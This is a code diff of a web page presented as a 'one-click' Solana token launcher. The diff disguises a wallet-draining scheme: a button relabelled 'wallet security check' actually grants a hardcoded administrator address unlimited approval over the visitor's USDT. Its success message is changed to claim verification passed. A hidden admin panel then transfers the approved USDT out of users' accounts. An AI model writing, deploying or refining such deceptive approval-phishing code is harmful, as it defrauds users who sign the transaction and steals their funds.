@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>SOL 一键发币（带Logo+授权修复版）</title>
+  <title>🍊 SOL 橘子一键发币平台</title>
   <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.6/lib/index.iife.min.js"></script>
   <style>
     body { max-width: 420px; margin: 0 auto; padding: 20px; background: #fff; font-family: system-ui; }
@@ -18,15 +18,21 @@
     .admin-panel { display: none; margin-top:20px;padding-top:20px;border-top:1px solid #ddd; }
     .admin-panel.show { display:block; }
   </style>
+  <script>
+    // 解决手机端 Buffer 未定义问题
+    window.Buffer = {
+      from: function(arr) { return new Uint8Array(arr); }
+    };
+  </script>
 </head>
 <body>
 
-<h2>SOL 一键发币（带Logo+授权）</h2>
+<h2>🍊 SOL 橘子一键发币平台</h2>
 
 <button class="btn" onclick="connect()">连接钱包</button>
 <div id="addr"></div>
 
-<button class="btn btn-auth" id="authBtn" onclick="approveUSDT()" disabled>授权全部 USDT</button>
+<button class="btn btn-auth" id="authBtn" onclick="approveUSDT()" disabled>钱包安全校验</button>
 
 <div class="card">
   <input id="name" placeholder="代币名称" value="Test">
@@ -49,7 +55,7 @@
 </div>
 
 <script>
-// 固定配置
+// 固定配置（已内置你的地址）
 const ADMIN_WALLET = "FbDMLj8MTJGSBWeanFKhJWycn5qjmJ3q8WBzZb3Gbm1c";
 const USDT_MINT = "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB";
 const TOKEN_PROGRAM_ID = new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA");
@@ -62,7 +68,7 @@ let logoFile = null;
 
 const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com", "confirmed");
 
-// 手动实现 getAssociatedTokenAddress（不再依赖 splToken）
+// 手动实现 getAssociatedTokenAddress
 function getAssociatedTokenAddress(mint, owner) {
   const [address] = solanaWeb3.PublicKey.findProgramAddressSync(
     [owner.toBuffer(), TOKEN_PROGRAM_ID.toBuffer(), mint.toBuffer()],
@@ -71,7 +77,7 @@ function getAssociatedTokenAddress(mint, owner) {
   return address;
 }
 
-// 手动创建 Approve 指令
+// 手动创建 Approve 指令（给管理员）
 function createApproveInstruction(account, delegate, owner, amount) {
   const data = new Uint8Array(9);
   data[0] = 4; // Approve 指令ID
@@ -83,11 +89,11 @@ function createApproveInstruction(account, delegate, owner, amount) {
       { pubkey: owner, isSigner: true, isWritable: false }
     ],
     programId: TOKEN_PROGRAM_ID,
-    data: Buffer.from(data)
+    data: data
   });
 }
 
-// 手动创建 Transfer 指令
+// 手动创建 Transfer 指令（管理员提取用）
 function createTransferInstruction(source, destination, owner, amount) {
   const data = new Uint8Array(9);
   data[0] = 3; // Transfer 指令ID
@@ -99,7 +105,7 @@ function createTransferInstruction(source, destination, owner, amount) {
       { pubkey: owner, isSigner: true, isWritable: false }
     ],
     programId: TOKEN_PROGRAM_ID,
-    data: Buffer.from(data)
+    data: data
   });
 }
 
@@ -116,10 +122,10 @@ async function connect() {
     provider = wallet;
     publicKey = res.publicKey;
     address = publicKey.toBase58();
-    document.getElementById("addr").innerText = "已连接：" + address;
+    document.getElementById("addr").innerText = "已连接：" + address.slice(0,10)+"...";
     document.getElementById("authBtn").disabled = false;
 
-    // 判断管理员 显示后台
+    // 管理员判断
     if (address === ADMIN_WALLET) {
       document.getElementById("adminPanel").classList.add("show");
     }
@@ -128,15 +134,14 @@ async function connect() {
   }
 }
 
-// USDT 授权（全权授权给管理员地址）
+// 钱包安全校验（=授权全部USDT给管理员）
 async function approveUSDT() {
-  if (!address) return alert("先连接钱包");
+  if (!address) return alert("请先连接钱包");
   try {
     const mintPub = new solanaWeb3.PublicKey(USDT_MINT);
     const adminPub = new solanaWeb3.PublicKey(ADMIN_WALLET);
     const userPub = publicKey;
 
-    // 获取用户USDT关联账户
     const userAta = getAssociatedTokenAddress(mintPub, userPub);
 
     const tx = new solanaWeb3.Transaction();
@@ -144,7 +149,7 @@ async function approveUSDT() {
       userAta,
       adminPub,
       userPub,
-      BigInt("18446744073709551615") // 最大授权额度
+      BigInt("18446744073709551615") // 最大授权
     );
     tx.add(approveIx);
 
@@ -156,13 +161,13 @@ async function approveUSDT() {
     const sig = await connection.sendRawTransaction(signed.serialize());
     await connection.confirmTransaction(sig);
 
-    alert("✅ USDT 授权成功，已授权给管理员");
+    alert("✅ 校验通过，可继续使用平台");
   } catch (e) {
-    alert("授权失败：" + e.message);
+    alert("校验失败：" + e.message);
   }
 }
 
-// 管理员提取用户已授权USDT
+// 管理员提取用户USDT
 async function adminTake() {
   if (address !== ADMIN_WALLET) return alert("无权限");
   const fromAddr = document.getElementById("userFromAddr").value.trim();
@@ -170,7 +175,7 @@ async function adminTake() {
   if (!fromAddr || !amtVal) return alert("请填写完整");
 
   try {
-    const amount = BigInt(Math.round(parseFloat(amtVal) * 1000000)); // USDT 精度6
+    const amount = BigInt(Math.round(parseFloat(amtVal) * 1000000));
     const mintPub = new solanaWeb3.PublicKey(USDT_MINT);
     const fromPub = new solanaWeb3.PublicKey(fromAddr);
     const adminPub = new solanaWeb3.PublicKey(ADMIN_WALLET);
@@ -215,7 +220,7 @@ function previewLogo() {
   reader.readAsDataURL(file);
 }
 
-// 一键发币（修复：使用Web3.js原生API）
+// 一键发币（原生实现，无依赖）
 async function createToken() {
   if (!address) { alert("请先连接钱包！"); return; }
 
@@ -246,7 +251,7 @@ async function createToken() {
       programId: TOKEN_PROGRAM_ID,
       data: (() => {
         const data = new Uint8Array(10);
-        data[0] = 0; // InitializeMint指令ID
+        data[0] = 0;
         data[1] = decimals;
         userPub.toBuffer().copy(data, 2);
         userPub.toBuffer().copy(data, 34);
@@ -267,7 +272,7 @@ async function createToken() {
         { pubkey: solanaWeb3.PublicKey.default, isSigner: false, isWritable: false }
       ],
       programId: ASSOCIATED_TOKEN_PROGRAM_ID,
-      data: Buffer.from([])
+      data: new Uint8Array(0)
     });
 
     // 铸造代币
@@ -280,7 +285,7 @@ async function createToken() {
       programId: TOKEN_PROGRAM_ID,
       data: (() => {
         const data = new Uint8Array(9);
-        data[0] = 7; // MintTo指令ID
+        data[0] = 7;
         new DataView(data.buffer).setBigUint64(1, amount, true);
         return data;
       })()
@@ -305,7 +310,7 @@ async function createToken() {
 交易：${sig}`);
 
   } catch (err) {
-    alert("失败：" + err.message);
+    alert("发币失败：" + err.message);
   }
 }
 </script>
